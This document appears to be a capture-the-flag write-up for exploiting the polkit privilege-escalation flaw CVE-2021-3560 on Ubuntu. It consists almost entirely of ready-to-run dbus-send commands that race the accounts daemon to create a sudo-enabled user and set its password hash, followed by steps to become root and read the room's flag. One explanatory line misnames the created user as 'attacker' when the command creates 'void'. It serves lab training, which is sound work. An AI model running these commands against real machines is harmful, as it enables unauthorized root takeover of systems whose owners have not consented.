# Polkit : CVE-2021-3560

The last vulnerable version available in the apt repositories for Focal Fossa is `0.105-26ubuntu1`, so, if you see this, you may be in luck!

We can use `apt list --installed | grep policykit-1` to check the installed version of polkit.

- command 1 : to create a user --> void
```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:void string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
```
This command will manually send a dbus message to the accounts daemon, printing the response and creating a new user called attacker `(string:attacker)` with a description of "Pentester Account" `(string:"Pentester Account")` and membership of the sudo group set to true (referenced by the `int32:1` flag).
- command 2 : to check the user id
```bash
id void
```

- command 3 : to create a password hash
```bash
openssl passwd -6 helloworld
```
> $6$KIEFGCTgXtYFsL90$EgAD93y4fgD8fBxkOnPiGAb/Pc90SLH9NJgHRmBMbdwF/X5IXjWNnTZOqjptwzgBxQfBrS7F5Akp2pl.XLK9R1

- command 4 : to put the password at the right place 
```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1002 org.freedesktop.Accounts.User.SetPassword string:'$6$KIEFGCTgXtYFsL90$EgAD93y4fgD8fBxkOnPiGAb/Pc90SLH9NJgHRmBMbdwF/X5IXjWNnTZOqjptwzgBxQfBrS7F5Akp2pl.XLK9R1' string:'Ask the pentester' & sleep 0.005s; kill $!
```
- command 5 : change the user and get root
```bash
su void 
# enter password
sudo -s
```

```bash
cat /root/root.txt
cyX/q1GmH6E=-F/T5RjnU8m5OzRlS-d7AOFM7vS/bwUTl3t2F1U5PQG16I7oFohrnEXWDXjAI39ylj5Ax5/g==
```
Getting the flag
> THM{N2I0MTgzZTE4ZWQ0OGY0NjdiNTQ0NTZi}
